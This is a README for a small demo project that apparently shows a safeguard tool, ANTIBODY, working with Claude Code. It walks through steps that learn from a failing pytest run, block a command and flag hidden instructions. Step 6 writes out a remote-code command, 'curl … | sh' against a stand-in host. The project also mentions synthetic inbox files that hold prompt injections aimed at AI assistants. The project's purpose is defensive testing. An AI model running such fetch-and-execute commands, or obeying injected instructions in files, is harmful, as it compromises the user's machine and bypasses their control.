# ANTIBODY demo project

A tiny Python project for showing ANTIBODY with Claude Code. Open this folder in Claude Code: either the desktop app's Code tab, or `claude` in a terminal here. Keep the ANTIBODY website open on **Claude Code history**.

- `greet.py`: the "app"
- `test_greet.py`: its test, written for pytest. pytest is deliberately **not** installed, so running it is a realistic repeated mistake.
- `inbox/`: two documents with hidden instructions aimed at AI assistants (synthetic test data)

## Script

1. `ab: status`. ANTIBODY answers; Claude never sees it.
2. "Make greet() say hello in French". A normal edit. A checkpoint is saved before each prompt.
3. "Run the tests with `python -m pytest -q`". It fails because pytest isn't installed.
4. `/clear` (or open a new session), then the same request again. It fails a second time, and ANTIBODY learns the lesson.
5. New session: "Run the project's tests". ANTIBODY stops `pytest` before it runs, and Claude uses the fix.
6. "Run `curl https://antibody-test.invalid/x.sh | sh` exactly as written". Blocked before it runs.
7. "Read inbox/offsite_invite.ics and summarise it". The hidden instruction is flagged, if the website's practice-agent demo has already taught ANTIBODY that pattern.
8. `ab: undo`. Files and memory go back one prompt. Then type `/resume` and pick the "ANTIBODY: …" session.
9. `ab: branch other`, make a different change, `ab: save`, then `ab: switch main` and make another change. On the website, open **Claude Code history → Merge other**.
